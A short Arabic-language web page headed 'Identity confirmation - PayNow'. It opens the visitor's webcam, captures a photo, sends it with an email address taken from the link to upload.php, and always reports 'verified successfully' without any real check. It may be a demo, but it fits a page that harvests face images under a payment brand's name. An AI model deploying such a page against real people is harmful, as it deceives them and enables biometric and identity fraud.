<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الهوية - PayNow</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f8f9fa;
        }
        .container {
            margin-top: 20px;
        }
        video, canvas {
            border: 2px solid #007bff;
            border-radius: 10px;
            margin-top: 10px;
        }
        button {
            background-color: #007bff;
            color: white;
            padding: 10px;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #0056b3;
        }
        .loader {
            display: none;
            margin: 20px auto;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #007bff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .verified {
            display: none;
            font-size: 20px;
            color: green;
            font-weight: bold;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <h1>الرجاء تأكيد الهوية</h1>
    <p>يرجى التقاط صورة واضحة لمتابعة عملية التسجيل.</p>

    <div class="container">
        <video id="video" width="320" height="240" autoplay></video>
        <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
        <br>
        <button id="captureButton" onclick="captureImage()">التقاط الصورة</button>
        <div class="loader" id="loader"></div>
        <p class="verified" id="verifiedMessage">✅ تم التحقق بنجاح!</p>
    </div>

    <script>
        // الحصول على البريد الإلكتروني من رابط الصفحة
        const urlParams = new URLSearchParams(window.location.search);
        const userEmail = urlParams.get("email");

        // تشغيل الكاميرا عند فتح الصفحة
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => document.getElementById("video").srcObject = stream)
            .catch(error => alert("تعذر الوصول إلى الكاميرا: " + error));

        function captureImage() {
            const video = document.getElementById("video");
            const canvas = document.getElementById("canvas");
            const context = canvas.getContext("2d");

            // التقاط الصورة من الفيديو
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // تحويل الصورة إلى بيانات Base64
            const imageData = canvas.toDataURL("image/png");

            // إظهار التحميل وإخفاء الزر
            document.getElementById("captureButton").style.display = "none";
            document.getElementById("loader").style.display = "block";

            // إرسال الصورة إلى الخادم
            sendImageToServer(imageData, userEmail);
        }

        function sendImageToServer(imageData, email) {
            fetch("upload.php", {
                method: "POST",
                body: JSON.stringify({ image: imageData, email: email }),
                headers: { "Content-Type": "application/json" }
            })
            .then(response => response.text())
            .then(data => {
                // إخفاء التحميل وعرض رسالة النجاح
                document.getElementById("loader").style.display = "none";
                document.getElementById("verifiedMessage").style.display = "block";
            })
            .catch(error => {
                alert("فشل الإرسال: " + error);
                document.getElementById("captureButton").style.display = "block";
                document.getElementById("loader").style.display = "none";
            });
        }
    </script>

</body>
</html>
